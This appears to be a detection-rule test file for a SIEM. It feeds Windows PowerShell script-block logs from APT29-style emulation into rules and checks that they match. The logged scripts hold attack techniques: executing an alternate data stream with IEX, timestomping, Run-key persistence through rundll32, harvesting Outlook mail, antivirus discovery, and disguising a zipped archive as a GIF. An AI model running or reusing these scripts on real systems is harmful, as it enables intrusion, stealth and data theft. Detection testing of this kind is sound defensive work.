"apt29w2.xrisbarney.local", "task": "2", "processID": "96", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91830')
        self.assertEqual(response.rule_level, 4)


    def test_powershell_executed_getusernameex(self) -> None:
        log = r'''
{ "win": { "eventdata": { "path": "C:\\\\Users\\\\itadmin\\\\Desktop\\\\stepThirteen.ps1", "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "function user { $Signature=@\\\" [DllImport(\\\"secur32.dll\\\", CharSet=CharSet.Auto, SetLastError=true)] public static extern int GetUserNameEx (int nameFormat, string userName, ref int userNameSize); public static string GUN() { string uname = \\\"                                        \\\"; int size = 40; int EXTENDED_NAME_FORMAT_NAME_DISPLAY = 2; string ret = \\\"\\\"; if(0 != GetUserNameEx(EXTENDED_NAME_FORMAT_NAME_DISPLAY, uname, ref size)) { ret += \\\"UserName:\\\\t\\\" + uname.ToString(); }   return ret; } \\\"@ Add-Type -MemberDefinition $Signature -Name GetUNameEx -Namespace Secur32 $result = [Secur32.GetUNameEx]::GUN() return $result }", "scriptBlockId": "ecd94e73-ad13-4309-b256-6ebd527f7a0f" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\nfunction user {\n$Signature=@\"\n[DllImport(\"secur32.dll\", CharSet=CharSet.Auto, SetLastError=true)]\npublic static extern int GetUserNameEx (int nameFormat, string userName, ref int userNameSize);\npublic static string GUN() {\nstring uname = \"                                        \";\nint size = 40;\nint EXTENDED_NAME_FORMAT_NAME_DISPLAY = 2;\nstring ret = \"\";\nif(0 != GetUserNameEx(EXTENDED_NAME_FORMAT_NAME_DISPLAY, uname, ref size))\n{\nret += \"UserName:\\t\" + uname.ToString();\n}  \nreturn ret;\n}\n\"@\nAdd-Type -MemberDefinition $Signature -Name GetUNameEx -Namespace Secur32\n$result = [Secur32.GetUNameEx]::GUN()\nreturn $result\n}\r\n\r\nScriptBlock ID: ecd94e73-ad13-4309-b256-6ebd527f7a0f\r\nPath: C:\\Users\\itadmin\\Desktop\\stepThirteen.ps1\"", "version": "1", "systemTime": "2021-10-29T15:32:45.0360677Z", "eventRecordID": "2630813", "threadID": "4724", "computer": "apt29w2.xrisbarney.local", "task": "2", "processID": "96", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91831')
        self.assertEqual(response.rule_level, 4)


    def test_powershell_executed_createtoolhelp32snapshot(self) -> None:
        log = r'''
{ "win": { "eventdata": { "path": "C:\\\\Users\\\\itadmin\\\\Desktop\\\\stepThirteen.ps1", "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "function pslist { $Signature=@\\\" [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)] private struct PROCESSENTRY32 { const int MAX_PATH = 260; internal UInt32 dwSize; internal UInt32 cntUsage; internal UInt32 th32ProcessID; internal IntPtr th32DefaultHeapID; internal UInt32 th32ModuleID; internal UInt32 cntThreads; internal UInt32 th32ParentProcessID; internal Int32 pcPriClassBase; internal UInt32 dwFlags; [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH)] internal string szExeFile; } [DllImport(\\\"kernel32\\\", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)] static extern IntPtr CreateToolhelp32Snapshot([In]UInt32  -MemberDefinition $Signature -Name CT32Snapshot  -Namespace Kernel32 $result = [Kernel32.CT32Snapshot]::CT32S() return $result }", "scriptBlockId": "03eb3886-b470-428f-8d1d-444c5ae2e453" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\nfunction pslist {\n$Signature=@\"\n[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]\nprivate struct PROCESSENTRY32\n{\nconst int MAX_PATH = 260;\ninternal UInt32 dwSize;\ninternal UInt32 cntUsage;\ninternal UInt32 th32ProcessID;\ninternal IntPtr th32DefaultHeapID;\ninternal UInt32 th32ModuleID;\ninternal UInt32 cntThreads;\ninternal UInt32 th32ParentProcessID;\ninternal Int32 pcPriClassBase;\ninternal UInt32 dwFlags;\n[MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH)]\ninternal string szExeFile;\n}\n[DllImport(\"kernel32\", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]\nstatic extern IntPtr CreateToolhelp32Snapshot([In]UInt32 03eb3886-b470-428f-8d1d-444c5ae2e453\r\nPath: C:\\Users\\itadmin\\Desktop\\stepThirteen.ps1\"", "version": "1", "systemTime": "2021-10-29T15:32:51.8185745Z", "eventRecordID": "2630845", "threadID": "4724", "computer": "apt29w2.xrisbarney.local", "task": "2", "processID": "96", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91832')
        self.assertEqual(response.rule_level, 4)


    def test_timestomp(self) -> None:
        log = r'''
{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"# This code was derived from https://github.com/matthewdunwoody/POSHSPY  function timestomp {  [CmdletBinding()] param (   [string] $dest  )  $source =  + '\\\\system32') | ? { !$_.PSIsContainer } | Where-Object { $_.LastWriteTime -lt \\\"01/01/2013\\\" } | Get-Random | %{ $_.FullName })  [IO.File]::SetCreationTime($dest, [IO.File]::GetCreationTime($source))  [IO.File]::SetLastAccessTime($dest, [IO.File]::GetLastAccessTime($source))  [IO.File]::SetLastWriteTime($dest, [IO.File]::GetLastWriteTime($source)) }","scriptBlockId":"e7e5e6f4-5b1c-4294-82fb-137c9dbc9a0c"},"system":{"eventID":"4104","keywords":"0x0","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","level":"5","channel":"Microsoft-Windows-PowerShell/Operational","opcode":"15","message":"\"Creating Scriptblock text (1 of 1):\r\n# This code was derived from https://github.com/matthewdunwoody/POSHSPY\n\nfunction timestomp {\n\t[CmdletBinding()] param (\n\t\t[string] $dest\n\t)\n\t$source =  + '\\system32') | ? { !$_.PSIsContainer } | Where-Object { $_.LastWriteTime -lt \"01/01/2013\" } | Get-Random | %{ $_.FullName })\n\t[IO.File]::SetCreationTime($dest, [IO.File]::GetCreationTime($source))\n\t[IO.File]::SetLastAccessTime($dest, [IO.File]::GetLastAccessTime($source))\n\t[IO.File]::SetLastWriteTime($dest, [IO.File]::GetLastWriteTime($source))\n}\n\r\n\r\nScriptBlock ID: e7e5e6f4-5b1c-4294-82fb-137c9dbc9a0c\r\nPath: \"","version":"1","systemTime":"2021-11-01T19:38:31.9490151Z","eventRecordID":"97256","threadID":"6276","computer":"hrmanager.ExchangeTest.com","task":"2","processID":"5300","severityValue":"VERBOSE","providerName":"Microsoft-Windows-PowerShell"}}}
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91834')
        self.assertEqual(response.rule_level, 6)


    def test_powershell_tampering_with_wmi_antivirusproduct_class(self) -> None:
        log = r'''
{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"function detectav {  $AntiVirusProducts = Get-WmiObject -Namespace \\\"root\\\\SecurityCenter2\\\" -Class AntiVirusProduct      $ret = @()     foreach($AntiVirusProduct in $AntiVirusProducts){          #Create hash-table for each computer         $ht = @{}         $ht.Name = $AntiVirusProduct.displayName         $ht.'Product GUID' = $AntiVirusProduct.instanceGuid         $ht.'Product Executable' = $AntiVirusProduct.pathToSignedProductExe         $ht.'Reporting Exe' = $AntiVirusProduct.pathToSignedReportingExe   $ht.'Timestamp' = $AntiVirusProduct.timestamp           #Create a new object for each computer         $ret += New-Object -TypeName PSObject -Property $ht      }     Return $ret }","scriptBlockId":"82a30873-d6cb-4690-bba9-1b3158b88081"},"system":{"eventID":"4104","keywords":"0x0","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","level":"5","channel":"Microsoft-Windows-PowerShell/Operational","opcode":"15","message":"\"Creating Scriptblock text (1 of 1):\r\nfunction detectav {\n\t$AntiVirusProducts = Get-WmiObject -Namespace \"root\\SecurityCenter2\" -Class AntiVirusProduct\n\n    $ret = @()\n    foreach($AntiVirusProduct in $AntiVirusProducts){\n\n        #Create hash-table for each computer\n        $ht = @{}\n        $ht.Name = $AntiVirusProduct.displayName\n        $ht.'Product GUID' = $AntiVirusProduct.instanceGuid\n        $ht.'Product Executable' = $AntiVirusProduct.pathToSignedProductExe\n        $ht.'Reporting Exe' = $AntiVirusProduct.pathToSignedReportingExe\n\t\t$ht.'Timestamp' = $AntiVirusProduct.timestamp\n\n\n        #Create a new object for each computer\n        $ret += New-Object -TypeName PSObject -Property $ht \n    }\n    Return $ret\n}\r\n\r\nScriptBlock ID: 82a30873-d6cb-4690-bba9-1b3158b88081\r\nPath: \"","version":"1","systemTime":"2021-11-01T19:52:17.4666547Z","eventRecordID":"97263","threadID":"6276","computer":"hrmanager.ExchangeTest.com","task":"2","processID":"5300","severityValue":"VERBOSE","providerName":"Microsoft-Windows-PowerShell"}}}
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91835')
        self.assertEqual(response.rule_level, 6)


    def test_powershell_tampering_software_installation_info_on_system_registry(self) -> None:
        log = r'''
{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"function software {   $keys = \\\"SOFTWARE\\\\Wow6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\",                    \\\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\"  $type = [Microsoft.Win32.RegistryHive]::LocalMachine  $regKey = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($type, $comp)  $ret = \\\"\\\"  foreach ($key in $keys) {   $a = $regKey.OpenSubKey($key)   $subkeyNames = $a.GetSubKeyNames()   foreach($subkeyName in $subkeyNames) {                     $productKey = $a.OpenSubKey($subkeyName)                     $productName = $productKey.GetValue(\\\"DisplayName\\\")                     $productVersion = $productKey.GetValue(\\\"DisplayVersion\\\")                     $productComments = $productKey.GetValue(\\\"Comments\\\")      $out = $productName + \\\" | \\\" + $productVersion + \\\" | \\\" + $productComments + \\\"`n\\\"      $ret += $out   }  }  Return $ret }","scriptBlockId":"2176a6be-c680-46ef-a6d8-5fa7ec788944"},"system":{"eventID":"4104","keywords":"0x0","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","level":"5","channel":"Microsoft-Windows-PowerShell/Operational","opcode":"15","message":"\"Creating Scriptblock text (1 of 1):\r\nfunction software {\n\t$keys = \"SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\",\n                   \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\"\n\t$type = [Microsoft.Win32.RegistryHive]::LocalMachine\n\t$regKey = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($type, $comp)\n\t$ret = \"\"\n\tforeach ($key in $keys) {\n\t\t$a = $regKey.OpenSubKey($key)\n\t\t$subkeyNames = $a.GetSubKeyNames()\n\t\tforeach($subkeyName in $subkeyNames) {\n                    $productKey = $a.OpenSubKey($subkeyName)\n                    $productName = $productKey.GetValue(\"DisplayName\")\n                    $productVersion = $productKey.GetValue(\"DisplayVersion\")\n                    $productComments = $productKey.GetValue(\"Comments\")\n\t\t\t\t\t$out = $productName + \" | \" + $productVersion + \" | \" + $productComments + \"`n\"\n\t\t\t\t\t$ret += $out\n\t\t}\n\t}\n\tReturn $ret\n}\r\n\r\nScriptBlock ID: 2176a6be-c680-46ef-a6d8-5fa7ec788944\r\nPath: \"","version":"1","systemTime":"2021-11-01T20:06:39.9348862Z","eventRecordID":"97265","threadID":"6276","computer":"hrmanager.ExchangeTest.com","task":"2","processID":"5300","severityValue":"VERBOSE","providerName":"Microsoft-Windows-PowerShell"}}}
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91836')
        self.assertEqual(response.rule_level, 3)


    def test_powershell_script_executed_convertsidtostringsid_api(self) -> None:
        log = r'''
{ "win": { "eventdata": { "path": "C:\\\\Users\\\\itadmin\\\\Desktop\\\\stepSixteen_SID.ps1", "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "$PID -DesiredAccess PROCESS_QUERY_LIMITED_INFORMATION  $hToken = OpenProcessToken -ProcessHandle $hProcess -DesiredAccess TOKEN_QUERY  $Success = $Advapi32::GetTokenInformation($hToken, $TOKEN_INFORMATION_CLASS::$TokenInformationClass, 0, $TokenPtrSize, [ref]$TokenPtrSize)  [IntPtr]$TokenPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPtrSize)  $Success = $Advapi32::GetTokenInformation($hToken, $TOKEN_INFORMATION_CLASS::$TokenInformationClass, $TokenPtr, $TokenPtrSize, [ref]$TokenPtrSize); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()  if($Success) {   $TokenOwner = $TokenPtr -as $TOKEN_OWNER   if($TokenOwner.Owner -ne $null) {    $OwnerSid = ConvertSidToStringSid -SidPointer $TokenOwner.Owner    $Sid = New-Object System.Security.Principal.SecurityIdentifier($OwnerSid)    $OwnerName = $Sid.Translate([System.Security.Principal.NTAccount])    $obj = New-Object -TypeName psobject    $obj | Add-Member -MemberType NoteProperty -Name Sid -Value $OwnerSid    $obj | Add-Member -MemberType NoteProperty -Name Name -Value $OwnerName    Write-Output $obj   }   else {    Write-Output \\\"Fail\\\"   }   [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPtr)  }  else {   Write-Debug \\\"[GetTokenInformation] Error: $(([ComponentModel.Win32Exception] $LastError).Message)\\\"  } }", "scriptBlockId": "c491303a-6988-412c-8618-1d8f1029fe01" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):$PID -DesiredAccess PROCESS_QUERY_LIMITED_INFORMATION\n\t$hToken = OpenProcessToken -ProcessHandle $hProcess -DesiredAccess TOKEN_QUERY\n\t$Success = $Advapi32::GetTokenInformation($hToken, $TOKEN_INFORMATION_CLASS::$TokenInformationClass, 0, $TokenPtrSize, [ref]$TokenPtrSize)\n\t[IntPtr]$TokenPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPtrSize)\n\t$Success = $Advapi32::GetTokenInformation($hToken, $TOKEN_INFORMATION_CLASS::$TokenInformationClass, $TokenPtr, $TokenPtrSize, [ref]$TokenPtrSize); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()\n\tif($Success) {\n\t\t$TokenOwner = $TokenPtr -as $TOKEN_OWNER\n\t\tif($TokenOwner.Owner -ne $null) {\n\t\t\t$OwnerSid = ConvertSidToStringSid -SidPointer $TokenOwner.Owner\n\t\t\t$Sid = New-Object System.Security.Principal.SecurityIdentifier($OwnerSid)\n\t\t\t$OwnerName = $Sid.Translate([System.Security.Principal.NTAccount])\n\t\t\t$obj = New-Object -TypeName psobject\n\t\t\t$obj | Add-Member -MemberType NoteProperty -Name Sid -Value $OwnerSid\n\t\t\t$obj | Add-Member -MemberType NoteProperty -Name Name -Value $OwnerName\n\t\t\tWrite-Output $obj\n\t\t}\n\t\telse {\n\t\t\tWrite-Output \"Fail\"\n\t\t}\n\t\t[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPtr)\n\t}\n\telse {\n\t\tWrite-Debug \"[GetTokenInformation] Error: $(([ComponentModel.Win32Exception] $LastError).Message)\"\n\t}\n}\r\n\r\nScriptBlock ID: c491303a-6988-412c-8618-1d8f1029fe01\r\nPath: C:\\Users\\itadmin\\Desktop\\stepSixteen_SID.ps1\"", "version": "1", "systemTime": "2021-11-03T11:15:23.9056264Z", "eventRecordID": "2634103", "threadID": "6156", "computer": "apt29w2.xrisbarney.local", "task": "2", "processID": "5212", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91817')
        self.assertEqual(response.rule_level, 4)


    def test_powershell_executed_get_content_stream_or_invoke_expresion_possible_string_execution_as_code(self) -> None:
        log = r'''
{ "win": { "eventdata": { "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "Get-Content '.\\\\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX", "scriptBlockId": "84d37fbf-a57c-4e2f-99b9-e79d3c2ed956" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\nGet-Content '.\\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX\r\n\r\nScriptBlock ID: 84d37fbf-a57c-4e2f-99b9-e79d3c2ed956\r\nPath: \"", "version": "1", "systemTime": "2021-11-01T15:47:12.4764636Z", "eventRecordID": "2115353", "threadID": "2168", "computer": "Workstation1.dc.local", "task": "2", "processID": "5712", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91837')
        self.assertEqual(response.rule_level, 4)


    def test_powershell_queried_win32_bios_possible_sandbox_detection_activity(self) -> None:
        log = r'''
{ "win": { "eventdata": { "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "gwmi -namespace root\\\\cimv2 -query \\\"SELECT * FROM Win32_BIOS\\\"", "scriptBlockId": "b73c1e9d-16c1-411b-948e-c9d356567c1e" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\ngwmi -namespace root\\cimv2 -query \"SELECT * FROM Win32_BIOS\"\r\n\r\nScriptBlock ID: b73c1e9d-16c1-411b-948e-c9d356567c1e\r\nPath: \"", "version": "1", "systemTime": "2021-11-01T15:47:13.3197975Z", "eventRecordID": "2115361", "threadID": "2168", "computer": "Workstation1.dc.local", "task": "2", "processID": "5712", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91838')
        self.assertEqual(response.rule_level, 4)


    def test_powershell_queried_win32_computersystem_possible_system_discovery_activity(self) -> None:
        log = r'''
{ "win": { "eventdata": { "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "gwmi -namespace root\\\\cimv2 -query \\\"Select * from Win32_ComputerSystem\\\"", "scriptBlockId": "e6788369-796a-4b17-b53b-e1af3adb5cca" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\ngwmi -namespace root\\cimv2 -query \"Select * from Win32_ComputerSystem\"\r\n\r\nScriptBlock ID: e6788369-796a-4b17-b53b-e1af3adb5cca\r\nPath: \"", "version": "1", "systemTime": "2021-11-01T15:47:44.1298641Z", "eventRecordID": "2115487", "threadID": "2168", "computer": "Workstation1.dc.local", "task": "2", "processID": "5712", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91839')
        self.assertEqual(response.rule_level, 4)


    def test_powershell_queried_win32_pnpentity_possible_devices_adapter_discovery_activity(self) -> None:
        log = r'''
{ "win": { "eventdata": { "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "gwmi -namespace root\\\\cimv2 -query \\\"SELECT * FROM Win32_PnPEntity\\\"", "scriptBlockId": "7ad5ccae-abbd-4e08-99b0-aedeb1953762" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\ngwmi -namespace root\\cimv2 -query \"SELECT * FROM Win32_PnPEntity\"\r\n\r\nScriptBlock ID: 7ad5ccae-abbd-4e08-99b0-aedeb1953762\r\nPath: \"", "version": "1", "systemTime": "2021-11-01T15:47:24.2399928Z", "eventRecordID": "2115404", "threadID": "2168", "computer": "Workstation1.dc.local", "task": "2", "processID": "5712", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91840')
        self.assertEqual(response.rule_level, 4)


    def test_powershell_queried_win32_process_possible_process_discovery_activity(self) -> None:
        log = r'''
{ "win": { "eventdata": { "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "gwmi -namespace root\\\\cimv2 -query \\\"SELECT * FROM Win32_Process\\\"", "scriptBlockId": "f06ae7f5-fff2-4204-b04f-2d0f5ee508d4" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\ngwmi -namespace root\\cimv2 -query \"SELECT * FROM Win32_Process\"\r\n\r\nScriptBlock ID: f06ae7f5-fff2-4204-b04f-2d0f5ee508d4\r\nPath: \"", "version": "1", "systemTime": "2021-11-01T15:47:44.2325037Z", "eventRecordID": "2115490", "threadID": "2168", "computer": "Workstation1.dc.local", "task": "2", "processID": "5712", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91841')
        self.assertEqual(response.rule_level, 4)


    def test_powershell_executed_get_item_path_script_trying_to_see_files_in_path(self) -> None:
        log = r'''
{ "win": { "eventdata": { "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "(Get-Item -Path \\\".\\\\\\\" -Verbose).FullName", "scriptBlockId": "11f76c3e-104b-49f4-b1b0-d76598efe5fd" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\n(Get-Item -Path \".\\\" -Verbose).FullName\r\n\r\nScriptBlock ID: 11f76c3e-104b-49f4-b1b0-d76598efe5fd\r\nPath: \"", "version": "1", "systemTime": "2021-11-01T15:48:15.8564304Z", "eventRecordID": "2115799", "threadID": "2168", "computer": "Workstation1.dc.local", "task": "2", "processID": "5712", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91842')
        self.assertEqual(response.rule_level, 4)


    def test_possible_addition_of_new_item_to_windows_startup_registry(self) -> None:
        log = r'''
{ "win": { "eventdata": { "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "New-ItemProperty -Force -Path \\\"HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" -Name \\\"WebCache\\\" -Value \\\"C:\\\\windows\\\\system32\\\\rundll32.exe $env:appdata\\\\Microsoft\\\\kxwn.lock,VoidFunc\\\"", "scriptBlockId": "b1231a56-2c12-4535-81cd-d35eefe429ad" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\nNew-ItemProperty -Force -Path \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"WebCache\" -Value \"C:\\windows\\system32\\rundll32.exe $env:appdata\\Microsoft\\kxwn.lock,VoidFunc\"\r\n\r\nScriptBlock ID: b1231a56-2c12-4535-81cd-d35eefe429ad\r\nPath: \"", "version": "1", "systemTime": "2021-11-01T15:48:17.0534599Z", "eventRecordID": "2115824", "threadID": "2168", "computer": "Workstation1.dc.local", "task": "2", "processID": "5712", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91844')
        self.assertEqual(response.rule_level, 12)


    def test_outlook_add_in_was_loaded_by_powershell(self) -> None:
        log = r'''
{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"# This code was derived from https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114/Get-Inbox.ps1  function psemail {  Add-type -assembly \\\"Microsoft.Office.Interop.Outlook\\\" | out-null  $olFolders = \\\"Microsoft.Office.Interop.Outlook.olDefaultFolders\\\" -as [type]  $outlook = new-object -comobject outlook.application  $namespace = $outlook.GetNameSpace(\\\"MAPI\\\")  $folder = $namespace.getDefaultFolder($olFolders::olFolderInBox)  $folder.items | Select-Object -Property Subject, ReceivedTime, SenderName, Body }","scriptBlockId":"40089664-d41b-4355-b655-0d8f36a78b68"},"system":{"eventID":"4104","keywords":"0x0","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","level":"3","channel":"Microsoft-Windows-PowerShell/Operational","opcode":"15","message":"\"Creating Scriptblock text (1 of 1):\r\n# This code was derived from https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114/Get-Inbox.ps1\n\nfunction psemail {\n\tAdd-type -assembly \"Microsoft.Office.Interop.Outlook\" | out-null\n\t$olFolders = \"Microsoft.Office.Interop.Outlook.olDefaultFolders\" -as [type]\n\t$outlook = new-object -comobject outlook.application\n\t$namespace = $outlook.GetNameSpace(\"MAPI\")\n\t$folder = $namespace.getDefaultFolder($olFolders::olFolderInBox)\n\t$folder.items | Select-Object -Property Subject, ReceivedTime, SenderName, Body\n}\r\n\r\nScriptBlock ID: 40089664-d41b-4355-b655-0d8f36a78b68\r\nPath: \"","version":"1","systemTime":"2021-11-05T19:04:41.4624006Z","eventRecordID":"97310","threadID":"4828","computer":"hrmanager.ExchangeTest.com","task":"2","processID":"6468","severityValue":"WARNING","providerName":"Microsoft-Windows-PowerShell"}}}
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91845')
        self.assertEqual(response.rule_level, 10)


    def test_powershell_used_net_compression_method(self) -> None:
        log = r'''
{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"function zip( $zipfilename, $sourcedir ) {    Add-Type -Assembly System.IO.Compression.FileSystem    $compressionLevel = [System.IO.Compression.CompressionLevel]::Optimal    [System.IO.Compression.ZipFile]::CreateFromDirectory($sourcedir, $zipfilename, $compressionLevel, $false)    Start-Sleep -s 3    \\t$fileContent = get-content $zipfilename  $fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)  $fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)  $fileContentEncoded | set-content $zipfilename  [Byte[]] $x = 0x47,0x49,0x46,0x38,0x39,0x61  $save = get-content $zipfilename  $x | set-content $zipfilename -Encoding Byte  add-content $zipfilename $save }","scriptBlockId":"279aee7f-0fa4-4cc6-8610-ce6112a598d3"},"system":{"eventID":"4104","keywords":"0x0","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","level":"5","channel":"Microsoft-Windows-PowerShell/Operational","opcode":"15","message":"\"Creating Scriptblock text (1 of 1):\r\nfunction zip( $zipfilename, $sourcedir )\n{\n   Add-Type -Assembly System.IO.Compression.FileSystem\n   $compressionLevel = [System.IO.Compression.CompressionLevel]::Optimal\n   [System.IO.Compression.ZipFile]::CreateFromDirectory($sourcedir, $zipfilename, $compressionLevel, $false)\n   Start-Sleep -s 3\n   \t$fileContent = get-content $zipfilename\n\t$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)\n\t$fileContentEncoded = 